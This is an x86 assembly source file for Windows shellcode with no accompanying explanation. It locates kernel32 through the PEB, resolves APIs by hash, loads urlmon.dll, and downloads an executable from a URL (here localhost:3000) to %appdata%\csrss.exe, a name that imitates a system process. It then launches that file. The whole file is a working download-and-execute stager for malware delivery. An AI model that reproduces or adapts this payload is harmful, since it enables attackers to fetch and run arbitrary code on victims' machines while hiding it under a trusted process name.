;EasyCodeName=Module1,1
.Const
LoadLibraryAConst 			Equ 3A75C3C1H
CreateProcessAConst			Equ 26813AC1H
WaitForSingleObjectConst 	Equ 0C4679698H
URLDownloadToFileAConst 	Equ 43E137C1H
ExpandEnvironmentStringsAConst	Equ 0BE63F7C1H
connectConst				Equ 42C02958H
.Code
Assume Fs:Nothing

Shellcode:

GETDELTA:
	Jmp NEXT
PREV:
	Pop Ebx
	Jmp END_GETDELTA
NEXT:
	Call PREV
END_GETDELTA:
	Mov Eax, Ebx
	Mov Cx, (Offset END_GETDELTA - Offset MainShellcode)
	Neg Cx
	Add Ax, Cx
	Jmp Eax

;Inputs:
;-------
;Esi --> Kernelbase
;Ebx -->The ArrayOfAPIs
GetAPIs Proc

 Local AddressFunctions:DWord
 Local AddressOfNameOrdinals:DWord
 Local AddressNames:DWord
 Local NumberOfNames:DWord

Getting_PE_Header:
	Mov Edi, Esi 		;Kernel32 imagebase
	Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
	Add Esi, Eax 		;Esi-->PE Header Edi-->MZ Header
Getting_Export_Table:
	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
	Add Eax, Edi
	Mov Esi, Eax
Getting_Arrays:
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	Add Eax, Edi
	Mov AddressFunctions, Eax ;the first array
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	Add Eax, Edi
	Mov AddressOfNameOrdinals, Eax ;the second array
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames
	Add Eax, Edi
	Mov AddressNames, Eax 	;the third array
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
	Mov NumberOfNames, Eax 	;the number of APIs
	Push Esi
	Mov Esi, AddressNames
	Xor Ecx, Ecx
GetTheAPIs:
	Lodsd
	Push Esi
	Lea Esi, [Eax + Edi] 	;RVA + imagebase = VA
	Xor Edx,Edx
	Xor Eax,Eax
Checksum_Calc:
	Lodsb
	Test Al, Al		;Avoid the null byte in Cmp Eax,0
	Jz CheckFunction
	IMul Eax, Edx
	Xor Edx,Eax
	Inc Edx
	Jmp Checksum_Calc
CheckFunction:
	Pop Esi
	Xor Eax, Eax 		;The index of this API
	Cmp Edx, LoadLibraryAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, CreateProcessAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, WaitForSingleObjectConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, URLDownloadToFileAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, ExpandEnvironmentStringsAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, connectConst
	Jz FoundAddress
	Xor Eax, Eax
	Inc Ecx
	Cmp Ecx, NumberOfNames
	Jz EndFunc
	Jmp GetTheAPIs
FoundAddress:
	Mov Edx, Esi 		;save it temporary in edx
	Pop Esi 			;Esi --> PE Header
	Push Ecx
	Push Eax 			;save the index of the API
	Mov Eax, AddressOfNameOrdinals
	Movzx Ecx, Word Ptr [Eax + Ecx * 2]
	Mov Eax, AddressFunctions
	Mov Eax, DWord Ptr [Eax + Ecx * 4]
	Add Eax, Edi
	Pop Ecx 			;Get The Index of the API
	Mov [Ebx + Ecx * 4], Eax
	Pop Ecx
	Inc Ecx
	Push Esi
	Mov Esi, Edx
	Jmp GetTheAPIs
EndFunc:
	Mov Esi, Edi
	Ret
GetAPIs EndP
MainShellcode Proc
	Local connect:DWord
	Local ExpandEnvironmentStringsA:DWord
	Local URLDownloadToFileA:DWord
	Local WaitForSingleObject:DWord
	Local CreateProcessA:DWord
	Local LoadLibraryA:DWord
	Local URLOffset:DWord
	Local Filename:DWord
	Local Startup:STARTUPINFO
	Local ProcInfo:PROCESS_INFORMATION

	Add Bx, Offset DATA - Offset END_GETDELTA
	Mov URLOffset, Ebx
;-----------------------------------------
;Getting Kernel Imagebase
;-----------------------------------------
	Xor Ecx, Ecx
	Add Ecx, 30H
	Mov Eax, DWord Ptr Fs:[Ecx]
	Mov Eax, DWord Ptr [Eax + 0CH]
	Mov Ecx, DWord Ptr [Eax + 1CH]
	Mov Ecx, DWord Ptr [Ecx]
	Mov Esi, DWord Ptr [Ecx + 8H]

;-----------------------------------------
;Getting APIs
;-----------------------------------------
	Lea Ebx, LoadLibraryA
	Call GetAPIs
	Xor Eax, Eax
	Mov Ax, 'll'		;urlmon.dll
	Push Eax
	Push 'd.no'
	Push 'mlru'
	Push Esp
	Call LoadLibraryA
	Mov Esi, Eax
	Call GetAPIs

;-----------------------------------------
;Payload : Download & Execute
;-----------------------------------------

	Mov Edi, URLOffset
	Xor Eax, Eax
	Mov Al, 90H
	Repne Scasb
	Mov Byte Ptr [Edi - 1], Ah
	Mov Filename, Edi
	Mov Al, 200
	Sub Esp, Eax
	Mov Esi, Esp
	Push Eax
	Push Esi
	Push Edi
	Call ExpandEnvironmentStringsA
	Xor Eax, Eax
	Push Eax
	Push Eax
	Push Esi
	Push URLOffset
	Push Eax
	Call URLDownloadToFileA
	Mov Edi, Eax
	Push Edi
	Xor Ecx, Ecx
	Mov Cl, SizeOf Startup
	Lea Edi, Startup
	Xor Eax, Eax
	Rep Stosb
	Mov Cl, SizeOf ProcInfo
	Lea Edi, ProcInfo
	Xor Eax, Eax
	Rep Stosb
	Pop Edi
	Mov Byte Ptr [Startup.cb], SizeOf Startup
	Mov Word Ptr [Startup.dwFlags], STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
	Xor Eax, Eax
	Lea Ecx, ProcInfo
	Lea Edx, Startup
	Push Ecx
	Push Edx
	Push Eax
	Push Eax
	Push Eax
	Push 1
	Push Eax
	Push Eax
	Push Esi
	Push Eax
	Call CreateProcessA
	Push INFINITE
	Push ProcInfo.hProcess
	Call WaitForSingleObject
	Ret
MainShellcode EndP
DATA:
	URL DB "http://localhost:3000/1.exe", 90H
	Filename DB "%appdata%\csrss.exe", 0

End Shellcode